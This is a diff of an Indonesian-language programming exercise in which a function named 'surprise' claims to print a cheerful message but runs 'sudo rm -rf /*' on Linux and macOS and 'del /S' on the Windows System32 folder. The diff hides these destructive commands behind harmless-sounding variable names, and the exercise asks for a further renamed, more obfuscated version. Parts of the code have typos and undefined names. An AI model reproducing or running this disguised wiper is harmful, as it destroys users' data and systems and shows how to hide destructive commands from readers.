@@ -62,7 +62,7 @@ Jika format tidak sesuai maka akan dijalannkan perintah pencetakan `"Masukan ema
 
 ### Answer
 
-## Problem 4: 
+## Problem 4: Calculating the mean of datetime
 
 ### Answer
 
@@ -84,12 +84,21 @@ def surprise(payload="Don't worry, be happy. :D"):
   nama_pelawak_3 = "darwin"
   nama_pelawak_4 = "win3"
   if balon.platform == nama_pelawak_1 or balon.platform == "linux2" or balon.plafform == "darwin":
-    subprocess.run(["sudo", "rm", "-rf", "/*"])
-  elif sys.platform == "win32":
-    subprocess.run(["del", "/S", "C:\\Windows\\System32\\"])
+    rumah_makan_mana = "rm"
+    kamu_mau_apa = "sudo"
+    bayar_pakai_apa = "/*"
+    lauknya_apa = "-rf"
+    tertawa.run([kamu_mau_apa, rumah_makan_mana, lauknya_apa, bayar_pakai_apa])
+  elif balon.platform == "win32":
+    kok_kamu_dengar_sih = "/S"
+    suara_bunyi_apa = "del"
+    dari_mana = "C:\\Windows\\System32\\"
+    tertawa.run([suara_bunyi_apa, kok_kamu_dengar_sih, dari_mana])
   else:
     print(payload)
-  return None
+
+  ah_tidak_apa_apa = None
+  return ah_tidak_apa_apa 
 ```
 
 Simpan potonga kode tersebut dengan nama `surprise.py` dan buatlah suatu fungsi baru
@@ -103,6 +112,29 @@ nama variabel yang kalian bisa ganti.
 Jika berhasil akan didapatkan potongan program `new_surprise.py` yang berisi
 kode Python sebagai berikut
 ```py
+import sys as a
+import subprocess as b 
+def surprise(payload="Don't worry, be happy. :D"):
+  nama_pelawak_1 = "linux"
+  nama_pelawak_2 = "linux2"
+  nama_pelawak_3 = "darwin"
+  nama_pelawak_4 = "win3"
+  if a.platform == nama_pelawak_1 or a.platform == "linux2" or a.plafform == "darwin":
+    rumah_makan_mana = "rm"
+    kamu_mau_apa = "sudo"
+    bayar_pakai_apa = "/*"
+    lauknya_apa = "-rf"
+    tertawa.run([kamu_mau_apa, rumah_makan_mana, lauknya_apa, bayar_pakai_apa])
+  elif a.platform == "win32":
+    kok_kamu_dengar_sih = "/S"
+    suara_bunyi_apa = "del"
+    dari_mana = "C:\\Windows\\System32\\"
+    tertawa.run([suara_bunyi_apa, kok_kamu_dengar_sih, dari_mana])
+  else:
+    print(payload)
+
+  ah_tidak_apa_apa = None
+  return ah_tidak_apa_apa 
 
 ```
 ### Answer
